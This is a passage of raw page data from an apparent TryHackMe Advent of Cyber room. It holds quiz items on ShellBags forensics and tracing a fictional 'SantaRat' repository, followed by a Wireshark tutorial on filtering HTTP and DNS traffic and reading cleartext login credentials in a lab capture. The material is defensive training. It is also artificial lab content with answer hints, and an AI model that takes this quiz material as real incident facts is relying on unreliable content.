.</p><p><img src=\"https://assets.tryhackme.com/additional/aoc2021/001_shellbags_explorer.png\" style=\"max-width:100%;height:auto\" /><br /></p><p><b>Read the above and open the <code>ShellBagsExplorer.exe</code></b> <b>application found in the folder on your Desktop.</b></p>","hint":""},{"questionNo":7,"question":"<p><span style=\"font-size:1rem\">With </span><code style=\"font-size:14px\">ShellBagsExplorer.exe</code><span style=\"font-size:1rem\">  open, use the top-bar menu to select </span><code style=\"font-size:14px\">File</code><span style=\"font-size:1rem\">  -&gt; </span><code style=\"font-size:14px\">Load offline hive</code><span style=\"font-size:1rem\"> and navigate to the location of where you saved the decoded </span><code style=\"font-size:14px\">UsrClass.dat</code><span style=\"font-size:1rem\"> . Load in the </span><code style=\"font-size:14px\">UsrClass.dat</code><span style=\"font-size:1rem\"> file and begin to explore the Shellbags discovered!</span></p><p><img src=\"https://assets.tryhackme.com/additional/aoc2021/002_shellbags_load.png\" style=\"max-width:100%;height:auto\" /><span style=\"font-size:1rem\"></span></p><p><span style=\"font-size:1rem\">Under the Desktop folder, there seems to be a suspicious folder named \"SantaRat\". Could this be a remote access trojan, that was used for further nefarious activity on Santa's laptop? Unfortunately, from just Shellbags alone, we only have insight into folder names (sometimes files, if we are lucky) and column data within Windows Explorer, but not files... how could we uncover more details?</span><br /></p><p>Drill down into the folders and see if you can find anything that might indicate how we could better track down what this SantaRat really is. <b>What specific folder name clues us in that this might be publicly accessible software hosted on a code-sharing platform?</b></p>","hint":"The folder name starts with a \".\" dot or period :)"},{"questionNo":8,"question":"<p>Additionally, there is a unique folder named \"Bag of Toys\" on the Desktop! This must be where Santa prepares his collection of toys, and this is certainly sensitive data that the actor could have compromised. <span style=\"font-weight:bolder\">What is the name of the file found in this folder? </span><br /></p>","hint":"It's a ZIP file! :)"},{"questionNo":9,"question":"<p>Track down this SantaRat software online. <span style=\"font-size:1rem\">It may be just as simple as searching for the name of the software on the suggested website (Github).</span></p><p><i>Note that the TryHackMe Windows analysis machine does not have Internet access, so you will need to explore in your own web browser.</i></p><p><img src=\"https://assets.tryhackme.com/additional/aoc2021/003_santarat_github.png\" style=\"max-width:100%;height:auto\" /><i></i></p><p><b style=\"font-size:1rem\">What is the name of the user that owns the SantaRat repository?</b><br /></p>","hint":"https://github.com/search?q=SantaRat"},{"questionNo":10,"question":"<p>Explore the other repositories that this user owns. <b>What is the name of the repository that seems especially pertinent to our investigation?</b></p>","hint":"https://github.com/Grinchiest"},{"questionNo":11,"question":"<p>Read the information presented in this repository. It seems as if the actor has, in fact, compromised and tampered with Santa's bag of toys! You can review the activity in the transcription logs. It looks as if the actor installed a special utility to collect and eventually exfiltrate the bag of toys. <b>What is the name of the <i>executable</i> that installed a unique utility the actor used to collect the bag of toys?</b></p>","hint":"You can find this in PowerShell_transcript.LAPTOP.b+XfnW7t.20211128154858.txt"},{"questionNo":12,"question":"<p>In the last transcription log, you can see the activity that this actor used to tamper with Santa's bag of toys! It looks as if they collected the original contents with a <a href=\"https://fileinfo.com/extension/uha\" target=\"_blank\">UHA</a> archive. A UHA archive is similar to a ZIP or RAR archive, but faster and with better compression rates. It is very rare to see, but it looks the Grinch Enterprises are pulling out all the tricks!</p><p>You can see the actor compressed the original contents of the bag of toys with a password. Unfortunately, we are unable to see what the specific password was in these transcription logs! Perhaps we could find it elsewhere...</p><p>Following this, the actor looks to have removed everything from the bag of toys, and added in new things like coal, mold, worms, and more!  <b>What are the contents of these \"malicious\" files (coal, mold, and all the others)?</b></p>","hint":"You can find this in PowerShell_transcript.LAPTOP.myCoN9lB.20211128155453.txt"},{"questionNo":13,"question":"<p>We know that the actor seemingly collected the original bag of toys. Maybe there was a slight OPSEC mistake, and we might be able to recover Santa's Bag of Toys! Review the actor's repository for its planned operations... maybe in the commit messages, we could find the original archive and the password!</p><p><img src=\"https://assets.tryhackme.com/additional/aoc2021/004_commits.png\" style=\"max-width:100%;height:auto\" /></p>","hint":""},{"questionNo":14,"question":"<p><b>What is the password to the original bag_of_toys.uha archive? </b>(You do not need to perform any password-cracking or bruteforce attempts)</p>","hint":"Look closely at the GitHub commit that includes the bag_of_toys.uha file. :)"},{"questionNo":15,"question":"<p>McSkidy was able to download and save a copy of the <code>bag_of_toys.uha</code> archive, and you have it accessible on the Desktop of the Windows analysis machine. After uncovering the password from the actor's GitHub repository, you have everything you need to restore Santa's original bag of toys!! </p><p>Double-click on the archive on the desktop to open a graphical UHARC extraction utility that has been prepared for you. Using the password you uncovered, extract the contents into a location of your choosing (you might make a \"Bag of Toys\" directory on the Desktop to save all the files into).</p><p>With that, you have successfully recovered the original contents of Santa's Bag of Toys! You can view these in the Windows Explorer file browser to see how many were present.</p><p><b>How many original files were present in Santa's Bag of Toys?</b></p>","hint":""}]},{"taskTitle":"[Day 9] <span class=\"badge badge-soft-warning size-16\">Networking</span> Where Is All This Data Going","taskDesc":"<p><span style=\"caret-color:rgb(0, 0, 0);color:rgb(0, 0, 0);font-size:medium\"><i>McSkidy recently found out that a large amount of traffic is entering one system on the network. Use your traffic analysis skills to determine what kind of activities Grinch Enterprises are performing.</i></span></p><h2><span style=\"font-size:24px\">Check out Alh4zr3d's walkthrough video for day 9 </span><a href=\"https://youtu.be/LnBT1qubCnc\" target=\"_blank\"><span style=\"font-size:24px\">here</span></a></h2><hr style=\"border:1px solid var(--main-color)\" /><p><span style=\"font-size:1rem\">In this task, we will walk you through the required skills and knowledge to perform a basic packet analysis using Wireshark.</span><br /></p><p>Packet analysis is a technique used to capture and intercept network traffic that passes the computer’s network interfaces. Packet analysis may also be called with different terms such as packet sniffer, packet analyzer, protocol analyzer, or network analyzer. As a cybersecurity individual, gaining packet analysis skills is an important requirement for network troubleshooting and communication protocol analysis. Using network analysis tools such as Wireshark, it captures network packets in real-time and displays them in a human-readable format. It provides many advanced features, including the live capture and offline analysis. This task covers the packet analysis steps in detail using Wireshark to analyze various protocols (unencrypted protocols) such as HTTP, DNS, and FTP.</p><p><span style=\"font-weight:bolder\">Required Skills and Knowledge</span></p><p>We’re assuming that the user has basic background skills to complete this task, requires theoretical and practical knowledge, including basic networking concepts, TCP/IP Stack, OSI Model, and TCP handshake. This applies not only to packet analysis but also to most other topics we will deal with in cybersecurity.</p><p><span style=\"font-weight:bolder\">Packet Analysis Tools</span></p><p>There are many tools that are used in network traffic analysis and network sniffing. Each of these tools provides a different way to capture or dissect traffic. Some offer ways to copy and capture, while others read and ingest using different interfaces. In this room, we will explore Wireshark. <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background-color:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">Keep in mind that these tools require administrator privileges.</span></p><p><span style=\"font-weight:bolder\">What is Wireshark?</span></p><p>Wireshark is pre-installed on the THM AttackBox, and you can just launch the THM AttackBox by using the Start AttackBox button and opening Wireshark.</p><p style=\"text-align:center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/f002123e9433de8ecf1e5f295ad68395.png\" /><br /></p><p>If you want to do this challenge on your own computer, Wireshark can be downloaded from here: <a href=\"https://www.wireshark.org/download.html\">Download Wireshark</a></p><p><span style=\"font-size:1rem\">For this task, we have prepared a PCAP file to download and follow the instructions and apply the required packet analysis skills using different scenarios. If you're using the AttackBox you don't need to download the file as it's already on the machine; the </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">AoC3.pcap</span><span style=\"font-size:1rem\"> </span><span style=\"font-size:1rem\">file is in the following location: </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">/root/Rooms/AoC3/Day9/AoC3.pcap</span><span style=\"font-size:1rem\">.</span></p><p><span style=\"font-size:1rem\">We can run Wireshark and import the provided PCAP file as follows,</span><br /></p><div class=\"terminal-content\"><div class=\"terminal-top\">Terminal</div><pre class=\"terminal-code\" style=\"font-size:14px\">           \n\t\t\t<code class=\"language-shell-session\">user@thm$ sudo wireshark /root/Rooms/AoC3/Day9/AoC3.pcap</code>\n\t    </pre></div><p>The Wireshark interface has five major components: The <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">command menus</span><span style=\"font-size:1rem\"> </span>are standard pulldown menus located at the top of the window. Of interest to us now are the File and Capture menus. The File menu allows you to save captured packet data or open a file containing previously captured packet data, and exit the Wireshark application.</p><p>The <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">display filter</span><span style=\"font-size:1rem\"> </span><span style=\"font-size:1rem\">section is where we can specify rules to find certain packets. The </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">listing of captured packets</span><span style=\"font-size:1rem\"> </span><span style=\"font-size:1rem\">shows all sent and received network packets. This section includes important fields that are used in the filter section, such as source and destination IP addresses, protocols, and information. Next, the </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">details of a selected packet header</span><span style=\"font-size:1rem\">. This section shows details about selected network packets and shows all headers, including all TCP layers information. Finally, the </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">packet content</span><span style=\"font-size:1rem\"> </span><span style=\"font-size:1rem\">which shows the packet content in hexadecimal and ASCII format.</span></p><p style=\"text-align:center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/13c778e7c432bb30a029dd5495056cdf.png\" style=\"width:979px\" /></p><p><span style=\"font-weight:bolder\">Filters</span></p><p><a href=\"https://en.wikipedia.org/wiki/Berkeley_Packet_Filter\" target=\"_blank\">Berkeley Packet Filter (BPF)</a> syntax is used in packet analyzers to filter specific packets pre-capture. Filtering packets is beneficial when locating information within a packet capture process. Wireshark's syntax is the primary method we will use in this room to locate certain protocols and information. Below we have included some examples of using Wireshark display filters:</p><p>Let's assume that we are looking for all packets that have been sent or received by the following IP address: <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">172.21.2.116</span>. Thus, the following filter is helping us to display all network packets that have the IP address <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">172.21.2.116</span><span style=\"font-size:1rem\">: </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">ip.addr == 172.21.2.116</span><span style=\"font-size:1rem\"> </span></p><p style=\"text-align:center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/e0b374773899e2415d2d8a4f61536b47.png\" /></p><p><span style=\"font-size:1rem\">As a result, we can see that we were able to show only the packet(s) that we needed.</span><br /></p><p>Next, we can also specify certain protocols, such as <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">HTTP</span><span style=\"font-size:1rem\"> </span>showing all packets for this protocol. We can also specify a domain name to narrow down the search. The following example shows that we are looking for <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">HTTP</span><span style=\"font-size:1rem\"> </span>packets that have the <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">google.com</span><span style=\"font-size:1rem\"> </span> domain name: <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">http contains google.com</span><span style=\"font-size:1rem\"> </span></p><p style=\"text-align:center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/6e94452efbd9ed1dd36660a51a23ebb4.png\" /></p><p>Next, we can also look at a specific port. Let's try to filter and list all packets for remote desktop protocol. We can do that by using <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">tcp.port</span><span style=\"font-size:1rem\"> </span>: <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">tcp.port == 3389</span><span style=\"font-size:1rem\"> </span></p><p style=\"text-align:center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/422856ce2908da0ad0210829f6b51639.png\" /></p><p>However, assume that you are monitoring the network traffic and you want to exclude the RDP packets. In this case, we can use the <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">not</span> <span style=\"font-size:1rem\">Wireshark rule as shown below.</span></p><p style=\"text-align:center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/0c91e1a5308ae7dc4392691273458605.png\" /></p><p>Next, we will perform the packet analysis technique using Wireshark on various protocols, including <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">HTTP</span>, <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">FTP</span>, and <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">DNS</span>. </p><p><span style=\"font-weight:bolder\">Note</span>: Make sure to open the Wireshark tool, and the <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">AoC3.pcap</span> file is imported to follow up with the content.</p><p><span style=\"font-weight:bolder;font-size:1rem\">HTTP #1 - GET</span><br /></p><p>We will be performing a packet analysis on the pre-captured network packets in the PCAP to analyze <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">HTTP</span><span style=\"font-size:1rem\"> </span>traffic. Once we open the PCAP using Wireshark, it will show a lot of network traffic since we connect using RDP protocol, making our work harder. However, we will be using a Wireshark filter to focus on web requests only. In this case, we are dealing with the <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">HTTP</span><span style=\"font-size:1rem\"> </span>protocol. Therefore, we can use Wireshark rules to make it easier. We can apply the following rule to the Wireshark filter to show only the HTTP traffic: <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">http</span><span style=\"font-size:1rem\">.</span></p><p>The following figure shows all HTTP traffic that has been sent to and from the webserver. In the first packet, we can see that the web request is sent from our machine <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">192.168.100.95</span><span style=\"font-size:1rem\"> </span> to the webserver, which is also our machine. In the information section, we can see also that we sent a <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">GET</span><span style=\"font-size:1rem\"> </span>request trying to get <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">/admin</span><span style=\"font-size:1rem\"> </span>content. On the next packet, the webserver replied to the sender with an HTTP response code <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">404,</span><span style=\"font-size:1rem\"> </span>which means it is <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">not found. </span>Suppose we need more details on a particular packet. In that case, we can expand (using the &gt; sign) the <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">Hypertext transfer protocol</span><span style=\"font-size:1rem\"> </span>subtree for more details about the sender request, such as the IP address of the host, web user agent, and other information.</p><p style=\"text-align:center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/22eca32f79868b6d029f6a5b46f70bfc.png\" /></p><p><span style=\"font-size:1rem\">We can </span><span style=\"font-size:1rem\">specify</span><span style=\"font-size:1rem\"> the HTTP method. In this case, we can </span><span style=\"font-size:1rem\">specify</span><span style=\"font-size:1rem\"> to show all the GET requests using the following </span><span style=\"font-size:1rem\">filter</span><span style=\"font-size:1rem\">: </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">http.request.method == GET</span><span style=\"font-size:1rem\">. </span><span style=\"font-size:1rem\">Keep following the </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">GET</span><span style=\"font-size:1rem\"> </span><span style=\"font-size:1rem\">HTTP requests and answer the question in this task.</span></p><p><span style=\"font-weight:bolder\">HTTP #1 - POST</span></p><p>In the second scenario, we check HTTP POST requests used to log into a web portal. In this section, we will be performing packet analysis to capture the username and password of the POST request. Make sure to open the PCAP file to perform the packet analysis. Your goal in this section is to inspect the HTTP packet to get the username and password. For more details, you double-click on the required packet that has the POST request. We can see all the required information we need in the hexadecimal section in cleartext. In addition, there are other ways that show more information the HTTP request, which is to follow the HTTP stream. We can do that by right-clicking on the required packet and then selecting <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">follow -&gt; TCP Stream</span><span style=\"font-size:1rem\"> </span>to see the web requests and their details.</p><p>In this section, we have to find the POST request and explore all packet information to answer question 2 and 3 in this task.</p><p><span style=\"font-weight:bolder\">DNS</span></p><p>DNS is like a giant phone book that takes a URL (Like https://tryhackme.com/) and turns it into an IP address. This means that people don’t have to remember IP addresses for their favorite websites.<span style=\"font-weight:bolder\"><br /></span></p><p>The provided PCAP file has DNS packets that have been received by our server. The domain name that we will look into is <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">packet.tryhackme.com</span>. Please note that is the domain name used in the PCAP file as an example.</p><p>First, make sure that you open the PCAP file. Then, using the Wireshark filter, we will specify DNS packets. This can be done using the <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">udp.port</span> filter. By default, the DNS protocol is running on UDP port 53 and sometimes on TCP port 53. In this task, we will go with the UDP port. Thus, the Wireshark filter will be as follows: <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">udp.port == 53</span><span style=\"font-size:1rem\"> </span>or <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">dns</span><span style=\"font-size:1rem\"> </span>only.</p><p style=\"text-align:center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/1b19379b4b2293060037c755c8697e13.png\" /></p><p> By double-clicking on the first DNS packet, we can see as follows:</p><p style=\"text-align:center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/0c75a59341f7cb5fab198054b5eb46a9.png\" /></p><p>By expanding the <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">Domain Name System (query)</span> subtree, it is obvious that this packet is a question <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">Questions: 1</span>, where the client queries a domain name and looks for an answer from the server. Also, by checking the Queries subtree, we can see that the client is asking for a type <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">A</span> record of the <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">packet.tryhackme.com</span><span style=\"font-size:1rem\"> </span>domain name.</p><p>Next, we will be looking at the response to the DNS request. In Wireshark, note that in the query request, which is the first DNS request, in the info field, we can see Transaction ID with a value of <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">query 0xef8e</span>. <u>Note that this query reference number may vary in your situation</u>. Thus, this query reference number is used to find the right DNS response of that query. To confirm that, check the field section where showing query <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">response 0xef8e A packet.tryhackme.com</span>.</p><p style=\"text-align:center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/a27736d55dd7c0c83666672113528df5.png\" /></p><p>By double-clicking on the required packet, we can see that it has an answer section, where it has the answer to our query, which is Address: <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">127.0.0.1</span>. This means that the type <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">A</span> DNS request of the <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, 